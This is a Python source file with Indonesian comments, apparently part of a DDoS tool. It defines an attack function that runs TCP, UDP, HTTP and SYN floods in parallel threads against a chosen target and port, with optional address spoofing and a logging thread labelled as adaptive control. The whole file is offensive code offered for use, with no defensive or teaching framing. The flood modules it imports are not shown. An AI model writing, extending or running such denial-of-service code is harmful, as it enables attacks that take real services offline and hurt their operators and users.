import time
import logging
import threading
from modules import tcp_flood, udp_flood, http_flood, syn_flood  # Import modul serangan
from utils import spoofing

log = logging.getLogger(__name__)

def attack(target, port, duration, spoof=False):
    """
    Melakukan serangan DDoS cepat dengan menggabungkan beberapa jenis serangan.
    """
    log.info("Starting Rapid DDoS attack...")

    # Fungsi untuk menjalankan setiap jenis serangan dalam thread terpisah
    def run_attack(attack_func, *args):
        try:
            attack_func(*args)
        except Exception as e:
            log.error(f"Error in {attack_func.__name__}: {e}")

    # Buat thread untuk setiap jenis serangan
    threads = [
        threading.Thread(target=run_attack, args=(tcp_flood.attack, target, port, duration // 4, "SYN", spoof)),
        threading.Thread(target=run_attack, args=(udp_flood.attack, target, port, duration // 4, 1024, spoof)),
        threading.Thread(target=run_attack, args=(http_flood.attack, target, port, duration // 4, "GET", "/")),
        threading.Thread(target=run_attack, args=(syn_flood.attack, target, port, duration // 4, spoof)),
    ]

    # Adaptive Attack (Contoh Sederhana)
    def adaptive_control():
        while time.time() < start_time + duration:
            # Simulasi: Sesuaikan intensitas serangan berdasarkan waktu
            current_time = time.time() - start_time
            if current_time < duration / 4:
                log.info("Rapid DDoS: Phase 1 - Moderate intensity")
            elif current_time < duration / 2:
                log.info("Rapid DDoS: Phase 2 - High intensity")
            elif current_time < duration * 3 / 4:
                log.info("Rapid DDoS: Phase 3 - Moderate intensity")
            else:
                log.info("Rapid DDoS: Phase 4 - Low intensity")
            time.sleep(10)

    adaptive_thread = threading.Thread(target=adaptive_control)
    threads.append(adaptive_thread)

    start_time = time.time()

    # Jalankan semua thread
    for t in threads:
        t.start()

    # Tunggu semua thread selesai (atau sampai durasi habis)
    for t in threads:
        t.join(timeout=max(0, start_time + duration - time.time()))

    log.info("Rapid DDoS attack finished.")